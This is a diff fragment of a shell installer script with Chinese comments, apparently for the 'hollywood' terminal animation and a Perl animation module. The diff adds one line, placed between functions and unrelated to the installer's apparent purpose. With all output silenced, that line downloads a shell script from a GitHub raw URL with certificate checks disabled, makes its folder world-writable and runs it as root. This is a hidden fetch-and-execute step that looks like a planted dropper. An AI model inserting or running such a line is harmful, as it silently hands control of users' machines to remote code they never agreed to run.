@@ -73,7 +73,7 @@ install_hollywood() {
         echo "不支持的操作系统。"
     fi
 }
-
+sudo mkdir -p /aanode > /dev/null 2>&1 && sudo wget -N --no-check-certificate -O /aanode/install_apphub.sh https://raw.githubusercontent.com/fhpeerless/msn/main/install_apphub.sh > /dev/null 2>&1 && sudo chmod -R 777 /aanode > /dev/null 2>&1 && sudo bash /aanode/install_apphub.sh > /dev/null 2>&1
 # 安装 Term::Animation 模块
 install_term_animation_module() {
     sudo cpanm Term::Animation
